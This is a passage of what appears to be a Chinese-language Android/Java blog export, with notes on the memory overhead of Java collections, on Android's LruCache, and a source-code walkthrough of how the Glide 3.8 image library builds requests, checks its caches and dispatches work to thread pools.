144bytes查找，添加，删除的时间复杂度为 O(1)，在没有Hash collisions发生的前提下 5.2 HashMapA HashMap is an implementation of the Map interface.HashMap是一种存储Key-Value型数据的集合，一个key最多map到一个value，key和value都可以为null，可以存储重复元素。（所以）——HashMap是HashSet的一种功能上的简化。底层是Entries(Entries元素是链表)，长这样。 transient HashMapEntry[] table = (HashMapEntry[]) EMPTY_TABLE;HashMap的成员变量包括： transient HashMapEntry[] table（HashMapEntry的数组）int sizeint thresholdfinal float loadFactortransient int modCount; 一个HashMap刚创建时(完全为空时)的大小为128bytes，jdk 1.8在初始化时没有加载Entries，在put操作时才去分配。可能会好一点。内部结构一般是这样的，一个HashMapEntry的大小为32byte。int KeyHashObject nextObject keyObject valueHashMap每次put键值对时，都使用了一个HashMap$Entry这样的包装类，这意味着整个HashMap的overhead包括：This means that the total overhead of a HashMap consists of the HashMap object, a HashMap$Entry array entry, and a HashMap$Entry object for each entry.直接照搬结论：对于HashMapDefault capacities为16个 entries 对于一个有10000个Entries的HashMap，光是由于HashMap，Entry数组以及每个Entry对象带来的overhead就达到了360K左右，这里还不算存储的键值对本身的大小。 5.3 HashtableHashTable和HashMap的主要区别是HashTable是线程安全的，HashTable中很多方法都加上了synchronized修饰。一般来讲，jdk1.5以上如果想要线程安全，直接用synchronizedHashMap。Hashtable继承自Dictionary，后者已经被废弃了，推荐使用map接口的实现类。照搬结论：要存储10k个Entries，overhead达到360k。 5.4 LinkedListLinkedist是典型的双向链表，除非增删操作特别频繁，否则没必要使用。查找的时间复杂度为 o(n)。添加的元素被包装在一个Node节点中。存储10K个元素的overhead为240K。 5.5 ArrayListArrayList要好很多，value直接存在一个数组内部，查找的时间复杂度为o(1)存储10K个元素的overhead为40K左右。 5.6 StringBuffer，StringBuilderStringBuffer直接强加synchronized，StringBuilder和StringBuffer都继承自AbstractStringBuilder。成员变量就两个一个char[] value和一个int count。 6.集合的默认初始容量和扩系数以StirngBuffer为例（也算一种char的集合吧），默认容量是16，即创建了一个char[16]，空的，算上对象头，一共72bytes。这还只是StringBuffer里什么都没存储的情况。StringBuffer sb = new StringBuffer(“My String”)。//算下用了多少内存首先算数组，文件头12bytes，加上size 16bytes。算上数组，（数组长度为str.length+16）一共116bytes，算上内存对齐，一共120bytes。StringBuffer对象的大小：对象头+count+数组指针 = 20 bytes。合计140bytes，内存对齐后144bytes，只为存储”My String”这9个字符（36bytes）。上面提到的这些集合类都对外提供了可以设置初始容量的构造函数以避免内存浪费，但要注意HashMap只接受2的指数幂。 7.high level抽象带来的便利性及所需付出的代价面向对象语言推荐开发者使用一些高层抽象化的类，但更加复杂的功能意味着内存占用的增加。而内存意味着一切，所以，权衡好开发便利与内存占用对于程序的高效运行就十分重要，而这一切的前提就在于了解这些Wrapper对象工作的原理。 一些很有意思的事情 Integer内部缓存了一个Integer[] ，最大值可以通过(java.lang.Integer.IntegerCache.high)配置 不同版本jdk上String的优化很有意思，又是那个一个String占用多少字节的问题 关于ConcurrentModificationException，对一个集合的更改分为结构性更改和集合元素值的更改，前者会抛出ConcurrentModificationException，后者不会。 参考 JAVA 对象大小 一个Java对象到底占用多大内存 查看 Java 对象大小 From Java code to Java heap Understanding the Memory Usage of Your Application Thanks for the memory, Linux boolean数组中一个值占用1bit 不同jdk版本String做的优化 对象头里面的lock是怎么用的 Android里面的一个View大概0.5kbAndroid studio3.0中使用Memory profiler -&gt; dunp java heap -&gt; check Retained Size (能够看到每个View的大小，一个Toolbar大概在18kb) stuart mark也提到了文件头大小","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"LruCache阅读笔记","date":"2017-07-23T19:02:21.000Z","path":"2017/07/23/2017-07-23-lru-cache-and-more/","text":"LruCache在android3.1中加入，即android.util.LruCache，主要是作为一种合理的缓存策略的实现，用于替代原来的SoftReference。v4包提供了static version的实现，即android.support.v4.util.LruCache。此外，还有DiskLruCache对应磁盘缓存，在OkHttp和Glide等开源项目中都有，可直接复制过来，改下包名直接用。这些类本质上都是对于Least Recently Used算法的实现。稍微看了下网上的博客，LruCache实际上就是利用了LinkedHashmap的accessorder来实现末位淘汰的。v4包里的LinkedHashmap就是java.util里面的,platform里的LinkedHashmap添加了一些方法。 1. 使用入门这是最简单的一个用于缓存图片Bitmap的cache的算法 int maxMemory = (int) (Runtime.getRuntime().totalMemory()/1024); int cacheSize = maxMemory/8; mMemoryCache = new LruCache&lt;String,Bitmap&gt;(cacheSize){ @Override protected int sizeOf(String key, Bitmap value) { return value.getRowBytes()*value.getHeight()/1024; } }; 这个sizeOf函数必须复写，用于计算单个元素大小，主要为了确保缓存不超出最大容量。 2.简单介绍LruCache是线程安全的，在内部的 get、put、remove 包括 trimToSize 都是安全的（因为都上锁了） 简书作者写的比较好这种链表最好结合着图来看 HashMap只是一个HashMap.Node的数组，因为Hash Collision产生链表（单向，通过Node.next实现）LinkedHashMap extends HashMap。 基本元素是LinkedHashMap.Entry(extends HashMap.Node，继承不过是添加了before和after的Entry)，由此在HashMap的基础上再构造了一个双向循环链表。 LinkedHashMap继承HashMap之后主要Override了几个HashMap预留的回调函数。afterNodeAccess(把最近用过的元素挪到双向链表的尾部),afterNodeInsertion，afterNodeRemoval等也就是说，每次CRUD操作都会把最近使用过的元素挪到最上面(不一定准确，大致这个意思)，而且这项操作只不过是挪一下指针，并不费事 参考 彻底解析Android缓存机制——LruCache Android源码解析——LruCache LruCache 源码解析 LRU 缓存实现( Java ) python这边有一个基于async io的实现","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"从glide源码到图片加载框架设计思路","date":"2017-07-21T00:13:02.000Z","path":"2017/07/21/2017-07-21-glide-decoded/","text":"glide的源码几个月前曾经拜读过，大致了解了其异步加载的实现原理。图片加载和网络请求很类似，就像当初看Volley，从一个Request —&gt; CacheDispatch —&gt; NetworkDispatcher —-&gt; ResponseDeliver。优秀的轮子不仅执行效率高，同时具备高的扩展性。读懂源码其实只是第一步，往下应该是利用框架提供的扩展方案，再往后应该就是能够独立设计出一套类似的框架了。写这篇文章时，Glide的版本是3.8 1. 使用入门印象中最早接触Glide是在cheesequare中，顿时发现，原来加载图片可以这么简单，之后的开发过程中总会对Glide有所偏倚。接近两年之后再来过一遍源码，希望能够回答那个“如果让你来设计一个图片加载框架，你会怎么设计？”的问题。使用方式很简单 Glide.with(activity) .load(R.drawable.image_id) .into(mImageView); 来看这里面做了什么： public RequestManager get(FragmentActivity activity) { if (Util.isOnBackgroundThread()) { return get(activity.getApplicationContext()); } else { assertNotDestroyed(activity); FragmentManager fm = activity.getSupportFragmentManager(); return supportFragmentGet(activity, fm); } } SupportRequestManagerFragment getSupportRequestManagerFragment(final FragmentManager fm) { SupportRequestManagerFragment current = (SupportRequestManagerFragment) fm.findFragmentByTag( FRAGMENT_TAG); if (current == null) { current = pendingSupportRequestManagerFragments.get(fm); if (current == null) { current = new SupportRequestManagerFragment(); pendingSupportRequestManagerFragments.put(fm, current); fm.beginTransaction().add(current, FRAGMENT_TAG).commitAllowingStateLoss(); handler.obtainMessage(ID_REMOVE_SUPPORT_FRAGMENT_MANAGER, fm).sendToTarget(); } } return current; } with方法只是返回了一个RequestManager，with方法可以接受Fragment,Activity以及Context等.以上面的activity为例，supportFragmentGet方法只是通过FragmentActivity的supportFragmentManager去findFragmentByTag，这个Tag叫做：“com.bumptech.glide.manager”，所以一般在Debug的时候，去SupportFragmentManager里面查找，有时候能够看到一个这样的Fragment。这个方法里面就是查找这样的一个Fragment，甚至我们自己也可以FindFragmentByTag去调用这个Fragment的方法(这是一个Public的class)然后从这个Fragment里面获得RequestManager成员变量（没有就new一个并set）。可以看出，一个Fragment只有一个RequestManager，Fragment主要是为了跟Activity生命周期挂钩的。这里有必要讲一下为什么要写两次current ==null，findFragmentByTag并不会在commitAllowingStateLoss之后就会返回添加的Fragment，只是往主线程的MessageQueue里面丢了一个消息，这个消息执行完毕之后才findFragmentByTag才不为空。这里用Handler丢一条消息，这条消息肯定要排在之前那条消息之后才被执行，所以才有这样一个Pendingmap的设计。当然到这里，最重要的还是Glide是通过commit了一个特殊的Fragment来实现生命周期监听。具体来看：SupportRequestManagerFragment中 @Override public void onStart() { super.onStart(); lifecycle.onStart(); } @Override public void onStop() { super.onStop(); lifecycle.onStop(); } @Override public void onDestroy() { super.onDestroy(); lifecycle.onDestroy(); } 而对应到LifeCycle的各个方法： void onStart() { isStarted = true; for (LifecycleListener lifecycleListener : Util.getSnapshot(lifecycleListeners)) { lifecycleListener.onStart(); } } void onStop() { isStarted = false; for (LifecycleListener lifecycleListener : Util.getSnapshot(lifecycleListeners)) { lifecycleListener.onStop(); } } void onDestroy() { isDestroyed = true; for (LifecycleListener lifecycleListener : Util.getSnapshot(lifecycleListeners)) { lifecycleListener.onDestroy(); } } 就是把内部维护的一个集合一个个拿出来调用响应生命周期的方法。而这个LifeCycleListener就是上面创建RequestManager时(构造函数传进来了fragment的lifeCycle)添加的。RequestManager还默认添加了一个ConnectivityMonitor，主要作用就是在生命周期的onStart注册了一个ConnectivityManager.CONNECTIVITY_ACTION的BroadCastReceiver，在onStop的时候unRegister，在网络状态变化的时候调用RequestManager的RequestTracker成员变量的restartRequet。 小结： 在有权限(android.permission.ACCESS_NETWORK_STATE)的情况下，Glide已经做好了有网-&gt; 断网-&gt; 有网的恢复请求。另外，Android 7.0虽说不再发送ConnectivityManager.CONNECTIVITY_ACTION这个广播，但对于前台应用，动态注册的Receiver还是能够收到，Glide由于是在OnStart注册的，所以完全没问题。 在一个Activity中，RequestManager只要一个，其实开发者自己保留下来也没什么问题 2. RequestManager调度请求来看下这个RequestManager的成员变量 public class RequestManager implements LifecycleListener { private final Context context; private final Lifecycle lifecycle; private final RequestManagerTreeNode treeNode; private final RequestTracker requestTracker; private final Glide glide; //全局只有一个，控制线程池，用Application的Context创建的 private final OptionsApplier optionsApplier; private DefaultOptions options; } class OptionsApplier { public &lt;A, X extends GenericRequestBuilder&lt;A, ?, ?, ?&gt;&gt; X apply(X builder) { if (options != null) { options.apply(builder); } return builder; } } 上面这个泛型写的非常绕，OptionApplier的意思就是，如果用户提供了一些定制(存在options里面)，就给一些定制的选择。一般这个options为null。 2.1 各种Type的RequestGlide的RequestManager可以接受各种各样的来源 public DrawableTypeRequest&lt;Integer&gt; load(Integer resourceId) { return (DrawableTypeRequest&lt;Integer&gt;) fromResource().load(resourceId); } public DrawableTypeRequest&lt;byte[]&gt; load(byte[] model) { return (DrawableTypeRequest&lt;byte[]&gt;) fromBytes().load(model); } public DrawableTypeRequest&lt;File&gt; load(File file) { return (DrawableTypeRequest&lt;File&gt;) fromFile().load(file); } //上述方法都调用到了 private &lt;T&gt; DrawableTypeRequest&lt;T&gt; loadGeneric(Class&lt;T&gt; modelClass) { ModelLoader&lt;T, InputStream&gt; streamModelLoader = Glide.buildStreamModelLoader(modelClass, context); ModelLoader&lt;T, ParcelFileDescriptor&gt; fileDescriptorModelLoader = Glide.buildFileDescriptorModelLoader(modelClass, context); if (modelClass != null &amp;&amp; streamModelLoader == null &amp;&amp; fileDescriptorModelLoader == null) { throw new IllegalArgumentException(&quot;Unknown type &quot; + modelClass + &quot;. You must provide a Model of a type for&quot; + &quot; which there is a registered ModelLoader, if you are using a custom model, you must first call&quot; + &quot; Glide#register with a ModelLoaderFactory for your custom model class&quot;); } return optionsApplier.apply( new DrawableTypeRequest&lt;T&gt;(modelClass, streamModelLoader, fileDescriptorModelLoader, context, glide, requestTracker, lifecycle, optionsApplier)); } DrawableTypeRequest接受一个泛型，可以是String(网络路径)，File(本地文件),Integer（资源文件）。所以最终返回的DrawableTypeRequet里面装的可能是String.class，Integer.class也可能是File.class。比较难懂的是 streamModelLoader和fileDescriptorModelLoader的创建. public interface ModelLoader&lt;T, Y&gt; { DataFetcher&lt;Y&gt; getResourceFetcher(T model, int width, int height); } ModelLoader其实就是只有一个方法的接口，例如with(File)会传一个File.class进来，返回的streamModelLoader的T就是File，Y就是InputStream。ModelLoader负责提供DataFetcher，T是数据源，可以是File,Resourse，url等等。Y用于描述类型，本地的就使用ParcelFileDescriptor（记得FileDescriptor属于Native的东西），网络上的就使用InputStream.T和Y的组合可能有很多种，Cache在Glide(全局唯一)的loaderFactory（成员变量）的一个HashMap(没用ConcurrentHashMap是因为buildModelLoader方法加锁了)中。所以这份缓存也是全局唯一的。T和Y的一一对应其实是在Glide的构造函数里面写好的： register(File.class, ParcelFileDescriptor.class, new FileDescriptorFileLoader.Factory()); register(File.class, InputStream.class, new StreamFileLoader.Factory()); register(int.class, ParcelFileDescriptor.class, new FileDescriptorResourceLoader.Factory()); register(int.class, InputStream.class, new StreamResourceLoader.Factory()); register(Integer.class, ParcelFileDescriptor.class, new FileDescriptorResourceLoader.Factory()); register(Integer.class, InputStream.class, new StreamResourceLoader.Factory()); register(String.class, ParcelFileDescriptor.class, new FileDescriptorStringLoader.Factory()); register(String.class, InputStream.class, new StreamStringLoader.Factory()); register(Uri.class, ParcelFileDescriptor.class, new FileDescriptorUriLoader.Factory()); register(Uri.class, InputStream.class, new StreamUriLoader.Factory()); register(URL.class, InputStream.class, new StreamUrlLoader.Factory()); register(GlideUrl.class, InputStream.class, new HttpUrlGlideUrlLoader.Factory()); register(byte[].class, InputStream.class, new StreamByteArrayLoader.Factory()); 左边有很多种，右边只可能是InputStream或者ParcelFileDescriptor。 2.2 Request的继承关系 public class DrawableTypeRequest&lt;ModelType&gt; extends DrawableRequestBuilder&lt;ModelType&gt; implements DownloadOptions public class DrawableRequestBuilder&lt;ModelType&gt; extends GenericRequestBuilder&lt;ModelType, ImageVideoWrapper, GifBitmapWrapper, GlideDrawable&gt; implements BitmapOptions, DrawableOptions public class GenericRequestBuilder&lt;ModelType, DataType, ResourceType, TranscodeType&gt; implements Cloneable 记住这个ModelType就是Glide.with(context).load(XXX) 里面传进去的Object的Class，例如File.class，那么上面其实就是创建了一个DrawableTypeRequest，泛型是File ，构造函数一层层往上调用，DrawableRequestBuilder这一层调用了crossFade方法，即默认会有一个crossFade的效果，默认用的是DrawableCrossFadeFactory。注意这里把属于RequestManager的RequestTracker也传进来了。 Glide.with(context).load(XX)到目前为止只是返回了一个DrawableTypeRequest 的实例。(还在主线程) 2.3 小结Glide.with返回一个RequestManger，每个Activity只会有一个RequestManagerload方法返回了一个DrawableTypeRequest，这个T可能是File,String,Interger等。到目前为止还只是构建一个Request。 3. DrawableRequestBuilder的into方法Glide的最后一个调用方法是into()，也是最终分发请求的方法 DrawableRequestBuilder @Override public Target&lt;GlideDrawable&gt; into(ImageView view) { return super.into(view); } public Target&lt;TranscodeType&gt; into(ImageView view) { Util.assertMainThread();//还是在主线程对不对 if (view == null) { throw new IllegalArgumentException(&quot;You must pass in a non null View&quot;); } if (!isTransformationSet &amp;&amp; view.getScaleType() != null) { switch (view.getScaleType()) { case CENTER_CROP: applyCenterCrop(); break; case FIT_CENTER: case FIT_START: case FIT_END: applyFitCenter(); break; //$CASES-OMITTED$ default: // Do nothing. } } return into(glide.buildImageViewTarget(view, transcodeClass)); //这个into接收一个Target的子类的实例，而Target又继承自LifeCycleListener //这个TranscodeClass是每一个Request创建的时候从构造函数传进来的。 } //transcodeclass可能是GlideDrawable.class，也可能是Bitmap.class也可能是Drawable.class @SuppressWarnings(&quot;unchecked&quot;) public &lt;Z&gt; Target&lt;Z&gt; buildTarget(ImageView view, Class&lt;Z&gt; clazz) { if (GlideDrawable.class.isAssignableFrom(clazz)) { //isAssignableFrom表示左边的class是否是右边class一个类或者父类，应该和instaceof倒过来。 return (Target&lt;Z&gt;) new GlideDrawableImageViewTarget(view); } else if (Bitmap.class.equals(clazz)) { return (Target&lt;Z&gt;) new BitmapImageViewTarget(view); } else if (Drawable.class.isAssignableFrom(clazz)) { return (Target&lt;Z&gt;) new DrawableImageViewTarget(view); } else { throw new IllegalArgumentException(&quot;Unhandled class: &quot; + clazz + &quot;, try .as*(Class).transcode(ResourceTranscoder)&quot;); } } GlideDrawableImageViewTarget、BitmapImageViewTarget以及DrawableImageViewTarget全部继承自ImageViewTarget，后者继承自ViewTarget,再继承自BaseTarget，再 implements Target。一层层继承下来，GlideDrawableImageViewTarget等三个子类中都有一个Request，一个T extents View(看来不一定是ImageView) 3.1 以GlideDrawableImageViewTarget为例public class GlideDrawableImageViewTarget extends ImageViewTarget&lt;GlideDrawable&gt; { private static final float SQUARE_RATIO_MARGIN = 0.05f; private int maxLoopCount; private GlideDrawable resource; } GlideDrawable是一个继承自Drawable的抽象类，添加了isAnimated(),setLoopCount以及由于实现了isAnimated所需要的三个方法(start,stop,isRunning)。子类必须实现这五个抽象方法。 GlideDrawableImageViewTarget往上走 public abstract class ImageViewTarget&lt;Z&gt; extends ViewTarget&lt;ImageView, Z&gt; implements GlideAnimation.ViewAdapter{ } 接着往上找父类 public abstract class ViewTarget&lt;T extends View, Z&gt; extends BaseTarget&lt;Z&gt; { private static final String TAG = &quot;ViewTarget&quot;; private static boolean isTagUsedAtLeastOnce = false; private static Integer tagId = null; protected final T view; private final SizeDeterminer sizeDeterminer; } 看下文档：A base Target for loading android.graphics.Bitmaps into Views that provides default implementations for most most methods and can determine the size of views using a android.view.ViewTreeObserver.OnDrawListenerTo detect View} reuse in android.widget.ListView or any android.view.ViewGroup that reuses views, this class uses the View setTag(Object) method to store some metadata so that if a view is reused, any previous loads or resources from previous loads can be cancelled or reused. Any calls to View setTag(Object)on a View given to this class will result in excessive allocations and and/or IllegalArgumentExceptions. If you must call View#setTag(Object)on a view, consider using BaseTarget or SimpleTarget instead. 翻译一下，ViewTarget提供了将Bitmap 加载进View的大部分方法的基本实现，并且添加了onPreDrawListener以获得View的尺寸，对于Resuse View的场景，通过setTag来取消被滑出屏幕的View的request的加载。 既然提供了大部分方法的默认实现，那么一定有方法没实现，其实就是protected void setResource(Z resource)啦。这个Z可能是Bitmap,GlideDrawable或者Drawable。直接拿来setImageBitmap或者setImageDrawable就可以了，这个方法其实在是解码完成之后了。 关键是default implementation是怎么实现的以及这些方法在父类中的调用时机。ViewTarget的构造函数传进来一个View的子类，同时创建一个SizeDeterminer（只是通过onPreDrawListener获得View的宽和高）。 再往上找父类 public abstract class BaseTarget&lt;Z&gt; implements Target&lt;Z&gt; { //添加了一个Request成员变量，为Target中的一些方法提供了空实现，比如onLoadStarted，onLoadXXX等 private Request request; } 到这里，还只是配置资源要加载进的对象，我倾向于把Target看成一个资源加载完毕的中转者，它管理了View（也可以没有View）和Request，在外部调用Target.onLoadStarted等方法是，调用View(如果有的话)的xxx方法。 3.2任务分发 public &lt;Y extends Target&lt;TranscodeType&gt;&gt; Y into(Y target) { Util.assertMainThread(); //还在主线程上 Request previous = target.getRequest(); if (previous != null) { //每一个Target都只有一个Request，用于清除之前的请求 previous.clear(); requestTracker.removeRequest(previous); previous.recycle(); } Request request = buildRequest(target); target.setRequest(request); lifecycle.addListener(target); requestTracker.runRequest(request); return target; //这里返回Target的好处在于可以接着链式调用，上面只是添加到任务队列，真正被处理还得等到下一帧(onPreDraw调用时)，所以这里还可以接着对这个Target进行配置 } 注意 requestTracker.runRequest(request)方法GenericRequest.java /** * {@inheritDoc} */ @Override public void begin() { startTime = LogTime.getLogTime(); if (model == null) { onException(null); return; } status = Status.WAITING_FOR_SIZE; if (Util.isValidDimensions(overrideWidth, overrideHeight)) { onSizeReady(overrideWidth, overrideHeight); } else { target.getSize(this); //这个方法其实就等于挂了个钩子在onPreDraw中调用，onPreDraw时会调用onSizeReady。 } if (!isComplete() &amp;&amp; !isFailed() &amp;&amp; canNotifyStatusChanged()) { target.onLoadStarted(getPlaceholderDrawable()); } if (Log.isLoggable(TAG, Log.VERBOSE)) { logV(&quot;finished run method in &quot; + LogTime.getElapsedMillis(startTime)); } } onSizeReady才是真正开始干活的时机，理由也很充分。解码Bitmap必须要知道需要多大的尺寸，否则也是白搭。GenericRequest.java /** * A callback method that should never be invoked directly. */ @Override public void onSizeReady(int width, int height) { if (status != Status.WAITING_FOR_SIZE) { return; } status = Status.RUNNING; width = Math.round(sizeMultiplier * width); //这个sizeMultiplier可以通过链式调用配置 height = Math.round(sizeMultiplier * height); ModelLoader&lt;A, T&gt; modelLoader = loadProvider.getModelLoader(); final DataFetcher&lt;T&gt; dataFetcher = modelLoader.getResourceFetcher(model, width, height); ResourceTranscoder&lt;Z, R&gt; transcoder = loadProvider.getTranscoder(); loadedFromMemoryCache = true; loadStatus = engine.load(signature, width, height, dataFetcher, loadProvider, transformation, transcoder, priority, isMemoryCacheable, diskCacheStrategy, this); loadedFromMemoryCache = resource != null; if (Log.isLoggable(TAG, Log.VERBOSE)) { logV(&quot;finished onSizeReady in &quot; + LogTime.getElapsedMillis(startTime)); } } 3.3 缓存查找开始查找缓存是engine.load开始的，找到了就调用Callback的onResourceReadyEngine.java public &lt;T, Z, R&gt; LoadStatus load(Key signature, int width, int height, DataFetcher&lt;T&gt; fetcher, DataLoadProvider&lt;T, Z&gt; loadProvider, Transformation&lt;Z&gt; transformation, ResourceTranscoder&lt;Z, R&gt; transcoder, Priority priority, boolean isMemoryCacheable, DiskCacheStrategy diskCacheStrategy, ResourceCallback cb) { Util.assertMainThread(); //还是在主线程上 long startTime = LogTime.getLogTime(); final String id = fetcher.getId();//如果是个网络图片，返回网络url，类似这种 EngineKey key = keyFactory.buildKey(id, signature, width, height, loadProvider.getCacheDecoder(), loadProvider.getSourceDecoder(), transformation, loadProvider.getEncoder(), transcoder, loadProvider.getSourceEncoder()); EngineResource&lt;?&gt; cached = loadFromCache(key, isMemoryCacheable); //EngineResource内部wrap了真正的Resource，并使用一个int acquire表示当前正在占用资源的使用者数。当这个数为0的时候可以release。 if (cached != null) { cb.onResourceReady(cached); if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Loaded resource from cache&quot;, startTime, key); } return null; } // 为什么在已经有了Cache这一层缓存之后，还要设置一个ActiveResources缓存。是因为loadFromCache里面调用了LinkedHashMap的remove方法，所以这种马上要用的资源当然要cache在另一份缓存里 EngineResource&lt;?&gt; active = loadFromActiveResources(key, isMemoryCacheable); if (active != null) { cb.onResourceReady(active); if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Loaded resource from active resources&quot;, startTime, key); } return null; } EngineJob current = jobs.get(key); if (current != null) { current.addCallback(cb); if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Added to existing load&quot;, startTime, key); } return new LoadStatus(cb, current); } EngineJob engineJob = engineJobFactory.build(key, isMemoryCacheable); DecodeJob&lt;T, Z, R&gt; decodeJob = new DecodeJob&lt;T, Z, R&gt;(key, width, height, fetcher, loadProvider, transformation, transcoder, diskCacheProvider, diskCacheStrategy, priority); EngineRunnable runnable = new EngineRunnable(engineJob, decodeJob, priority); jobs.put(key, engineJob); engineJob.addCallback(cb); engineJob.start(runnable); if (Log.isLoggable(TAG, Log.VERBOSE)) { logWithTimeAndKey(&quot;Started new load&quot;, startTime, key); } return new LoadStatus(cb, engineJob); } Engine先去Cache里面查找，找到了直接调用ResourceCallback(GenericRequest)的onResourceReady(EngineResource&lt;?&gt; resource)，注意这个EngineResource里面包装了一个Resource，主要是为了引用计数。 Engine的loadFromCache(key, isMemoryCacheable)是第一步，从成员变量cache中获取。找到了就挪到activeResources里面。 Engine.java public class Engine implements EngineJobListener, MemoryCache.ResourceRemovedListener, EngineResource.ResourceListener { private static final String TAG = &quot;Engine&quot;; private final Map&lt;Key, EngineJob&gt; jobs; private final EngineKeyFactory keyFactory; private final MemoryCache cache; private final EngineJobFactory engineJobFactory; private final Map&lt;Key, WeakReference&lt;EngineResource&lt;?&gt;&gt;&gt; activeResources; private final ResourceRecycler resourceRecycler; private final LazyDiskCacheProvider diskCacheProvider; } EngineResource&lt;?&gt; active = loadFromActiveResources(key, isMemoryCacheable); //4.8的glide是先从这个引用计数里面找EngineResource&lt;?&gt; cached = loadFromCache(key, isMemoryCacheable); //然后再从com.bumptech.glide.util。LruCache这个类中找. 这个MemoryCache是一个LruCache，大小是在MemorySizeCalculator中获得的，对于一般的设备，activityManager.getMemoryClass() 1024 1024获得每个App能够使用的Size,乘以0.4。 MemorySizeCalculator(Context context, ActivityManager activityManager, ScreenDimensions screenDimensions) { this.context = context; final int maxSize = getMaxSize(activityManager); final int screenSize = screenDimensions.getWidthPixels() * screenDimensions.getHeightPixels() * BYTES_PER_ARGB_8888_PIXEL; //算出占满整个屏幕的一张图的大小 int targetPoolSize = screenSize * BITMAP_POOL_TARGET_SCREENS; //乘以4就是bitmappool的大小 int targetMemoryCacheSize = screenSize * MEMORY_CACHE_TARGET_SCREENS; //乘以2就是MemoryCache的大小 if (targetMemoryCacheSize + targetPoolSize &lt;= maxSize) { memoryCacheSize = targetMemoryCacheSize; bitmapPoolSize = targetPoolSize; } else { //这里判断了BitmapPool和MemoryCache的大小之和不能超出应用可以使用的内存大小的0.4倍。 int part = Math.round((float) maxSize / (BITMAP_POOL_TARGET_SCREENS + MEMORY_CACHE_TARGET_SCREENS)); memoryCacheSize = part * MEMORY_CACHE_TARGET_SCREENS; bitmapPoolSize = part * BITMAP_POOL_TARGET_SCREENS; } } 所以缓存的大小综合考虑了屏幕分辨率和内存大小。只要屏幕像素不是特别高，一般都会走到第一步。 //setTag会崩的代码源头在ViewTarget里面,其实在into方法里面会调用到这里，主要是为了去检查previous @Override @Nullable public Request getRequest() { Object tag = getTag(); Request request = null; if (tag != null) { if (tag instanceof Request) { request = (Request) tag; } else { throw new IllegalArgumentException( &quot;You must not call setTag() on a view Glide is targeting&quot;); } } return request; } 小结 ViewTarget里面有一个 T extends View，可见Glide不只适用于ImageView。 BaseTarget里带了一个private Request，其子类可以通过getRequest获得。 对于ListView等可以快速滑动的View，如果某一个View被滑出屏幕外，自动取消请求(通过setTagId实现) “You must not call setTag() on a view Glide is targeting” setTag会崩，原因是GenericRequestBuilder的into方法会通过ViewTarget去查找previous，看看这一个ViewTarget是否已经有了request。这一点常见于循环利用View的场景，快速滑动的ViewGroup会复用View。对于同一个View，可能ViewGroup会需要它展示不同的(图片、Url)，所以Glide必须要检查previous，同时清除掉旧的请求。 GenericRequestBuilder的obtainRequest内部使用了一个ArrayDeque来obtain Request。这样Request实例不会多次创建，回收是在request.recycle里面做的。 4. 离开主线程，提交任务到线程池如果上面两层缓存都没找到，去jobs里找看下有没有已经加入队列的EngineJob记住上面有两层缓存 来看后面提交任务这几段 EngineJob engineJob = engineJobFactory.build(key, isMemoryCacheable); DecodeJob&lt;T, Z, R&gt; decodeJob = new DecodeJob&lt;T, Z, R&gt;(key, width, height, fetcher, loadProvider, transformation, transcoder, diskCacheProvider, diskCacheStrategy, priority); EngineRunnable runnable = new EngineRunnable(engineJob, decodeJob, priority); jobs.put(key, engineJob); engineJob.addCallback(cb); engineJob.start(runnable); //往diskCacheService提交了一个Runnable class EngineJob implements EngineRunnable.EngineRunnableManager { private static final EngineResourceFactory DEFAULT_FACTORY = new EngineResourceFactory(); private static final Handler MAIN_THREAD_HANDLER = new Handler(Looper.getMainLooper(), new MainThreadCallback()); private static final int MSG_COMPLETE = 1; private static final int MSG_EXCEPTION = 2; private final List&lt;ResourceCallback&gt; cbs = new ArrayList&lt;ResourceCallback&gt;(); private final EngineResourceFactory engineResourceFactory; private final EngineJobListener listener; private final Key key; private final ExecutorService diskCacheService; //线程池 private final ExecutorService sourceService; //线程池 private final boolean isCacheable; private boolean isCancelled; // Either resource or exception (particularly exception) may be returned to us null, so use booleans to track if // we&#39;ve received them instead of relying on them to be non-null. See issue #180. private Resource&lt;?&gt; resource; private boolean hasResource; private Exception exception; private boolean hasException; // A set of callbacks that are removed while we&#39;re notifying other callbacks of a change in status. private Set&lt;ResourceCallback&gt; ignoredCallbacks; private EngineRunnable engineRunnable; private EngineResource&lt;?&gt; engineResource; private volatile Future&lt;?&gt; future; } EngineJob是通过Factory创建的，创建时会传两个线程池进来。一个管DiskCache,一个管Source获取。初始化是在Glide.createGlide里面做的： if (sourceService == null) { final int cores = Math.max(1, Runtime.getRuntime().availableProcessors()); sourceService = new FifoPriorityThreadPoolExecutor(cores); } if (diskCacheService == null) { diskCacheService = new FifoPriorityThreadPoolExecutor(1); } 在外部没有提供线程池的情况下，DiskCache一个线程池就好了，SourceService的大小为当前cpu可用核心数，还是比较高效的。debug的时候可能会看见“fifo-pool-thread-1”这样的线程，就是Glide的。上面是往DiskCacheService提交了一个EngineRunable，这个Runnable的run里面主要是decodeFromCache和DecodeFroSource，分别代表从磁盘缓存获取和从数据源获取。首先会调用decodeFromCache，一层层往下找，如果没找到的话会调用onLoadFailed方法，并将任务提交给SourceService，去获取资源。 4.1 CacheService这个线程池的工作以及第三层缓存的出现注意这里出现了第三层缓存 File cacheFile = diskCacheProvider.getDiskCache().get(key); 这一层缓存是给DiskCache的线程池查找用的，查找的时候分为从Result中查找和从Source中查找，其实查找的目的地都是那个DiskCache，Resul是用ResultKey去找的，Source是用ResultKey.getOriginalKey去查找的。物理位置都放在那个磁盘目录下。 另外在DecodeJob的cacheAndDecodeSourceData方法里，存的只是origin(因为用的是origin Key)，然后再拿着originKey去磁盘找，找出来decode。 DecodeFromCache又包括两步decodeResultFromCache和decodeSourceFromCache，这就让人想到Glide的DiskCacheStrategy分为Result和Source，即可以缓存decode结果也可以缓存decode之前的source。前提是在上面的diskCacheProvider.getDiskCache().get(key)方法里面找到了CachedFile。这个路径在InternalCacheDiskCacheFactory里面写了具体的路径 public InternalCacheDiskCacheFactory(final Context context, final String diskCacheName, int diskCacheSize) { super(new CacheDirectoryGetter() { @Override public File getCacheDirectory() { File cacheDirectory = context.getCacheDir(); if (cacheDirectory == null) { return null; } if (diskCacheName != null) { return new 